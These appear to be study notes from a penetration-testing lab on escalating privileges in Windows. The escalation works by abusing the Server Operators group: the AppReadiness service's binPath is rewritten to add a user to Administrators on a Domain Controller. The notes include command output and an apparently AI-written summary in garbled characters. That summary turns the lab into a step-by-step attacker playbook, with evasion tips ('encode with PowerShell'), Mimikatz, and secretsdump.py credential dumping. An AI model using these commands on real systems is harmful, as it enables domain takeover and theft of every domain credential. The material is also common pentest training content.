The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services.

Querying the AppReadiness Service
Let's examine the AppReadiness service. We can confirm that this service starts as SYSTEM using the sc.exe utility.

  Server Operators
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
Checking Service Permissions with PsService
We can use the service viewer/controller PsService, which is part of the Sysinternals suite, to check permissions on the service. PsService works much like the sc utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.

This confirms that the Server Operators group has SERVICE_ALL_ACCESS access right, which gives us full control over this service.

Checking Local Admin Group Membership
Let's take a look at the current members of the local administrators group and confirm that our target account is not present.

  Server Operators
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
Modifying the Service Binary Path
Let's change the binary path to execute a command which adds our current user to the default local administrators group.

  Server Operators
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
Starting the Service
Starting the service fails, which is expected.

  Server Operators
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
Confirming Local Admin Group Membership
If we check the membership of the administrators group, we see that the command was executed successfully.

  Server Operators
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
Confirming Local Admin Access on Domain Controller
From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.

GPT Sumamry 
üß† Summary ‚Äî Server Operators = Service Abuse ‚Üí Local Admin ‚Üí DC Looting
Server Operators group is heavily privileged, especially on DCs

They can:

Log in locally

Start/stop/configure services (üî•)

Use SeBackupPrivilege and SeRestorePrivilege

You don‚Äôt need to be a Domain Admin ‚Äî you just need to modify the right service (like AppReadiness) to run your command as SYSTEM

üîÅ Got This, Do That Workflow
üîç Step 1: Check Group Membership
cmd
Copy
Edit
net localgroup "Server Operators"
‚úÖ If you're listed ‚Üí you‚Äôre in a strong position

‚öôÔ∏è Step 2: Identify a SYSTEM-Level Service You Can Control
Use:

cmd
Copy
Edit
sc qc AppReadiness
or

cmd
Copy
Edit
PsService.exe security AppReadiness
‚úÖ Look for SERVICE_ALL_ACCESS and SERVICE_START_NAME : LocalSystem

üí£ Step 3: Abuse the Service
Modify the service binary:

cmd
Copy
Edit
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <your_user> /add"
Start the service:

cmd
Copy
Edit
sc start AppReadiness
üí° It‚Äôll fail to run, but that‚Äôs okay ‚Äî the command still executes.

üßë‚Äçüíª Step 4: Confirm Local Admin Access
cmd
Copy
Edit
net localgroup Administrators
Now you're local admin on a DC, which gives you:

Full registry access

Ability to dump NTDS secrets

Install tools like Mimikatz

Pull secrets with:

bash
Copy
Edit
secretsdump.py -just-dc-user administrator
üîÄ If This, Then That Decision Tree
Condition	Action
Member of Server Operators	Look for services you can control
Service runs as SYSTEM and is DEMAND_START	Change binPath ‚Üí execute your command
Can‚Äôt start service	Try another service or reboot if allowed
Need full DA	Use dumped NTLM hash or AES key to pivot further
üß¨ Patterns You Should Recognize
binPath hijack is a classic escalation move

SERVICE_ALL_ACCESS = full control, even if you're not DA

Local admin on a Domain Controller is as good as DA if you know where to look

üí° Hints / Tips
Many orgs underestimate Server Operators group

Services like AppReadiness, Fax, Spooler often run as SYSTEM and are underused

If command is too obvious or blocked, encode with PowerShell or drop a custom binary

You can also add any other user to a group from here, not just yourself

‚úÖ Cleanup Reminder
If asked for proof without causing too much damage, you can:

Remove your user from local admin group:

cmd
Copy
Edit
net localgroup Administrators <user> /delete
Restore original service binPath:

cmd
Copy
Edit
sc config AppReadiness binPath= "C:\Windows\System32\svchost.exe -k AppReadiness -p"
Or explain clearly in report: binPath was temporarily modified to demonstrate exploitation; reverted after.

üß† TL;DR:
Server Operators = full service control + SYSTEM runner.
Use it to quietly inject yourself into Local Admins on a DC ‚Äî and from there, secretsdump.py the world.
